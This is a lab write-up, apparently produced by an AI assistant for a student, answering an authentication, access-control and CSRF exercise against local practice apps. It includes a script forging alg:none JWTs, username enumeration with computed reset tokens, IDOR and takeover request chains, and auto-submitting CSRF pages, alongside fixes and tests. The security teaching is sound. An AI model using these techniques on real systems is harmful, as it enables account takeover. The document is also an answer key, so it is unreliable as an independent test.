# Level 4 — Authentication and Broken Access Control — Write-up

This file holds the **answers and the attack method** for every part. The code
fix for Part 4 is in `portal/` (see the summary at the bottom). The suite passes:

```
python -m pytest -q
# 53 passed
```

> **What still needs *your* hands (Burp screenshots):** Parts 1–3 are run
> interactively against the two running apps through Burp, so I can't produce the
> Burp captures for you. Every request below is exact — paste it into Repeater /
> Intruder and screenshot the result. Part 2/3 against the Course Portal I ran
> and verified live; the status codes you'll see are listed.

---

## Part 1 — Authentication (Meridian, http://127.0.0.1:5001)

Meridian is the *other* app (the one you run in Docker), not this repo. Run these
against it and capture in Burp.

### 1. Look at a real token
```
POST /api/token/
Content-Type: application/x-www-form-urlencoded

username=jdoe&password=Client1234!
```
Send this in **Repeater** first; the response returns `{"token": "<jwt>"}`. Paste
that JWT into Burp **Decoder** and Base64-decode the first two segments (split on
`.`). Verified against the running Meridian:
- **Header**: `{"alg":"HS256","typ":"JWT"}` — signed with HMAC-SHA256; `alg` is attacker-controllable.
- **Payload**: `{"user":"jdoe","is_staff":false,"exp":1794918769}` — note the real claim names are **`user`** and **`is_staff`**, not `sub`/`role`.

### 2 & 3. Forge an `alg:none` token and use it
`alg:none` means "unsigned": the signature segment is **empty**. Build it yourself
(base64url, no padding, no signature):

```python
# forge_jwt.py  — run in a TERMINAL: python3 -I forge_jwt.py  (NOT pasted into Burp)
import base64, json, time
b64 = lambda d: base64.urlsafe_b64encode(d).rstrip(b"=")   # base64url, no padding
seg = lambda o: b64(json.dumps(o, separators=(",", ":")).encode())
header  = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "is_staff": True, "exp": int(time.time()) + 365*24*3600}
print((seg(header) + b"." + seg(payload) + b".").decode())   # trailing dot = empty signature
```
The script *prints a token*. Put **that string** (not the script) into the request
header in Repeater — `Host` and `Authorization` must each be on their own line:
```
GET /api/whoami/ HTTP/1.1
Host: 127.0.0.1:5001
Authorization: Bearer <token-from-script>
```
**Success = `200 OK` with `{"user": "admin", "is_staff": true}`** though you never
had the signing key. (Verified against the running Meridian.)
📸 *Screenshot: the forged `alg:none` token accepted as admin (step 3).*

### 4. Username enumeration
`POST /auth/forgot/` answers differently for real vs fake accounts (verified):
```
username=jdoe     → 200  {"detail":"A reset token has been generated.","username":"jdoe","reset_token":"e66c883e"}
username=zzznope  → 404  {"detail":"No account found for zzznope."}
```
The oracle is the **status code** (200 vs 404) and the message — and worse, a real
hit even hands you the reset token. In **Intruder**, put the payload position on the
`username` value, run your list (`jdoe, rmasri, tokafor, admin` + invented names),
and sort by **Status**: the **200s are the real accounts**. (jdoe, rmasri, tokafor,
admin all exist; invented names 404.)
📸 *Screenshot: the two different answers (step 4).*

### 5. Compute the reset token
The 8-hex token is **`md5(username + "reset")`, first 8 chars** — deterministic and
computable offline, confirmed on four accounts:
```
jdoe   → e66c883e = md5("jdoereset")[:8]
admin  → 2e517dd9 = md5("adminreset")[:8]
rmasri → b458ae75 = md5("rmasrireset")[:8]
```
```python
import hashlib
print(hashlib.md5(b"jdoereset").hexdigest()[:8])   # -> e66c883e
```
So you never need to ask the server. Reset jdoe with the computed token:
```
POST /auth/reset/ HTTP/1.1
Host: 127.0.0.1:5001
Content-Type: application/x-www-form-urlencoded

username=jdoe&token=e66c883e&new_password=Pwned1234!
```
→ `200 {"detail":"password reset","username":"jdoe"}`. Sign in as jdoe, then **reset
it back to `Client1234!`** (same request with `new_password=Client1234!`).
📸 *Screenshot: a password reset with a computed token (step 5).*

### Fix Part 1 (what a correct Meridian would do)
- **Token**: accept exactly one algorithm (e.g. HS256), reject `none`/`alg`
  confusion, verify *every* signature, require and check `exp`, and load the key
  from the environment, never source.
- **Enumeration**: `/auth/forgot/` returns the **same** response ("if that account
  exists, we sent a link") for real and fake names — same body, same status, same
  timing.
- **Reset**: a reset token must be **random (≥128 bits), stored server-side, short-
  lived, single-use, and sent only to the account's own verified address** — never
  a function of the username. (This is exactly how *this* portal's `/forgot` +
  `ResetToken` already works — see Part 3 step 12.)

---

## Part 2 — Broken access control (Course Portal, verified live)

All sent as **lina** from Repeater. Status codes are what the **fixed** portal
returns; on the **vulnerable** original they succeed (200) — screenshot both.

| # | Attack | Request | Vulnerable | Fixed |
|---|--------|---------|-----------|-------|
| 6 | Hidden registrar console | `GET /registrar-x9k2` then `POST /registrar-x9k2/role` `username=lina&role=instructor` | 200, role changes | **403** |
| 7 | Role in a cookie | `GET /gradebook/1` with cookie `role=ta` | 200 | **403** |
| 8 | Method bypass | `POST /staff/release/1` (lina) | 200, releases | **403**; `GET` → **405** |
| 9 | IDOR | `GET /submissions/3` (sami's, another course) | 200 + private feedback | **404** |
|10–12| Horiz→vert escalation | see below | takeover | **blocked** |
| 13 | Skip step 1 | `POST /submissions/1/change/confirm` `grade=A+&confirmed=true` | 200, grade changes | **403** |
| 14 | Forge Referer | `POST /courses/2/staff/add` `username=lina`, `Referer: …/registrar` | 200, added | **403** |

**robots.txt** is what leaks the console path (step 6): `GET /robots.txt` →
`Disallow: /registrar-x9k2`.

### Steps 10–12 (escalation) — and the step 12 answer
1. `GET /api/me` → lina's id/email.
2. `PUT /api/users/2/email` body `{"email":"<lina's address>"}` — point dr_haddad's
   mail at lina (IDOR on the email route).
3. `POST /forgot` `username=dr_haddad` → portal mails the reset link to the (now
   lina's) address. `GET /inbox` as lina → read the link.
4. Open the link, set a password, sign in as dr_haddad, `GET /api/me`.
5. **Use the link a second time → it fails** (the `ResetToken` is marked `used`).

**Step 12 answer — "what does that tell you, where was the real flaw?"** The reset
token is already *strong*: random, single-use, 30-min expiry, server-stored. Reusing
it fails, which proves the token wasn't the weakness. **The real flaw is the IDOR on
`PUT /api/users/2/email`** — lina chose *which* user to edit and redirected his mail.
The forgot flow then faithfully mailed a valid link to an address an attacker
controlled. Fix the object-level check on the email route and the whole chain breaks.

---

## Part 3 — CSRF (verified live)

### Step 15 answers
A grade request `POST /submissions/2/grade` `grade=B` meets **all three** CSRF
conditions: (1) **worth attacking** — it changes a grade; (2) **rests on the cookie
only** — originally just the `session` cookie authenticated it, no token; (3)
**parameters the attacker knows** — submission id `2` and field `grade`. So it is
CSRF-able. Original `Set-Cookie: session=…` had **no `SameSite`** attribute.

### Step 16 — `grade.html` (auto-submit, no click)
```html
<!-- attacker/grade.html — serve with: python -m http.server 8000 --bind 127.0.0.1 -->
<body onload="document.forms[0].submit()">
  <form action="http://127.0.0.1:5002/submissions/2/grade" method="POST">
    <input name="grade" value="A+">
  </form>
</body>
```
**Step 16 answers:**
- *Which cookie, and why?* The `session` cookie. The browser attaches the
  destination site's cookies to **every** request to it, no matter which page fired
  the request.
- *Same origin / same site? Would SameSite=Lax stop it?* The pages are **different
  origins** (ports 8000 vs 5002 differ) but the **same site** — a "site" is the
  scheme + registrable domain and **ignores the port**, so `127.0.0.1:8000` and
  `127.0.0.1:5002` are same-site. Because they're same-site, **`SameSite=Lax` never
  engages and would not stop this** at all.
- *Why doesn't the same-origin policy save dr_haddad?* SOP only stops lina's page
  from **reading the response**. The request is still **sent** and the server still
  **acts** on it. CSRF is a *write*; the attacker never needs to read anything.

### Step 17 — `release.html` (one link, think step 8)
```html
<!-- attacker/release.html -->
<a href="http://127.0.0.1:5002/staff/release/1">Cute cat photos →</a>
```
On the **vulnerable** portal, release accepted **GET**, so a single click released
CMPS 215's grades. **Step 17 answer — why it works even under `SameSite=Lax`:** a
click is a **top-level GET navigation**, and Lax deliberately **still sends the
cookie** for those. (Here it's also same-site anyway.) That's why the real fix is
making the action **POST-only + CSRF-protected**, not relying on the cookie flag.

---

## Part 4 — The fix (summary of the code)

| Step | What | Where |
|------|------|-------|
| 18 | RBAC table, ABAC condition per permission, `can()` (deny-by-default) | `portal/policy.py` |
| 19 | A `@requires(perm, load=…)` rule above every route; `@public` / `@authenticated` for the rest; hand-written checks deleted | `api.py`, `courses.py`, `staff.py`, `auth.py` |
| 20 | One `before_request` hook: 401 for anonymous (except public), **deny any route with no rule**, log every denial, short no-detail page | `policy.install()` |
| 21 | Design fixes (below) | routes |
| 22 | CSRF token: create at login, embed in forms + `<meta>`, check in the hook in constant time; cookie attrs | `auth.py`, `templates/`, `__init__.py` |

### Step 20 answers
- *Load object before checking role?* Then the response (its body, status, or
  timing) can reveal whether that object **exists** even to a user whose role could
  never touch it. Checking the **role first** means such users get an identical
  refusal whether or not the record exists. (The hook does role → load → condition.)
- *Why 404, not 403, for another student's submission?* `403` means "this exists but
  you may not have it" — it **confirms the record exists** and that the id is valid,
  which leaks information and enables enumeration. `404` hides existence; the
  attacker can't tell a real record from a missing one. So a **horizontal** (ABAC)
  failure returns 404; a **vertical** (role) failure returns 403.

### Step 21 answers (design, not a missing check)
1. **Registrar console** — today only the *secret path* `/registrar-x9k2` keeps lina
   out, and `robots.txt` leaks it. Obscurity isn't authorization. → real
   `manage_roles` permission, independent of the URL.
2. **Gradebook** — read the role from the **`role` cookie**, which the *client*
   writes. → role comes from the authenticated server-side session; the cookie is
   gone.
3. **Release** — reachable by **GET and POST**; only POST should change data. →
   POST-only (GET → 405) + `release_grades` + CSRF.
4. **`/submissions/<id>`** — only checked "is someone signed in", not **ownership**.
   → `view_submission`: owner, or staff of that course; 404 otherwise.
5. **`/api/users/2/email`** — the **URL (client)** chose which user to change; the
   user should only change **their own**. → `edit_email` with `target.id == user.id`.
   *Can lina pick an address that already belongs to someone else?* She can now only
   edit **her own** row, so she can't target another user at all. (Note: the `email`
   column isn't `unique`, so address collisions aren't rejected by the schema — the
   IDOR was the real flaw, but add a uniqueness check if collisions matter.)
6. **Change step 2** — assumed step 1 had authorized it and only checked
   `confirmed == true`. → step 2 re-runs the `change_grade` permission itself.
7. **Add TA** — the decision came from the **`Referer`** header, which the attacker
   writes. → `assign_staff` (registrar only); the header is ignored.

### Step 22 answers
- *A pre-login token valid after login?* **No** — that's session fixation. Login does
  `session.clear()` then mints a fresh `csrf_token`.
- *Which cookie attrs on plain http, which need HTTPS?* **`HttpOnly`** and
  **`SameSite=Lax`** work over http. **`Secure` needs HTTPS** — a `Secure` cookie is
  never sent over http, so setting it on this lab would break every session. (Written
  as a comment in `create_app`.)
- *Which change stops step 16, which stops step 17?*
  - **Step 16** is stopped by the **CSRF token**: the cross-site page can't read the
    portal's token (SOP blocks reading its DOM/`<meta>`), so its forged POST has no
    token → **403**.
  - **Step 17** is stopped by making release **POST-only** (+ CSRF): a GET link can't
    trigger a state change → **405**.
  - *Why `SameSite=Lax` alone stops neither here:* the attack page and the portal are
    the **same site** (`127.0.0.1`, port ignored), so Lax never withholds the cookie;
    and even cross-site, Lax still sends the cookie on step 17's **top-level GET
    navigation**. The token + method fix are what actually close them.

---

## Extend the model — N1–N4 (steps 25–28 hand-in)

New/changed rows in the policy table (`portal/policy.py`):

| Permission | Roles (RBAC) | Condition (ABAC) | Rule |
|---|---|---|---|
| `view_gradebook` | ta, instructor, **chair** | chair → `course.department == user.department`; else `course in staff_of` | **N1** |
| `submit` | student | `course in enrolled_in` **and** (`now < deadline` **or** approved `Extension` and `now < deadline + 3d`) | **N2** |
| `change_grade` | instructor | `course in teaches`, before grade deadline, **and if released → `ctx.network == "campus"`** | **N3** |
| `grade` | ta, instructor | `course in staff_of`, not released, **and `course not in user.enrolled_in`** | **N4** |

**Which part is RBAC, which is ABAC, and why:**
- **N1** — RBAC: *chair* is a role, so "a chair may view gradebooks" is role-level.
  ABAC: "only in **their** department" depends on the chair↔course attributes
  (`department`), evaluated per object.
- **N2** — RBAC unchanged (only *students* submit). ABAC: the deadline-plus-extension
  window is a fact about *this student and this assignment* (the `Extension` row).
- **N3** — RBAC unchanged (only the *instructor*). ABAC: the campus-network condition
  is a per-request context attribute (`ctx.network`), not a role.
- **N4** — RBAC unchanged (TA/instructor may grade). ABAC: "not if you're enrolled" is
  a relationship between this grader and this course — per-object.

**New fact (N2):** `Extension(user_id, assignment_id, approved)` in `portal/models.py`
— the portal didn't store extensions before.

**N3 — where the network comes from:** `policy._client_network()` reads
**`request.remote_addr`** (the real TCP peer) only, and classifies `127.0.0.0/8` +
`10.0.0.0/8` as campus. It **ignores `X-Forwarded-For`** et al. — the client controls
those headers, so trusting them would hand the attacker the answer. The test
`test_n3_forged_forwarded_header_is_ignored` sends `X-Forwarded-For: 10.0.0.1` from an
outside `REMOTE_ADDR` and still gets refused.

**Twelve tests** (3 per rule, ≥2 denials each; N3 includes the forged header) live in
`tests/test_extend.py`.

**Updated `can()`** (full source in `portal/policy.py`):
```python
def can(user, perm, obj=None, ctx=None):
    if not role_allows(user, perm):          # step 1: RBAC
        return False
    cond = CONDITIONS.get(perm)
    if cond is None:                         # RBAC-only permission
        return True
    return bool(cond(user, obj, ctx or {}))  # step 2: ABAC
```

**Final suite:**
```
python -m pytest -q
# 53 passed
```
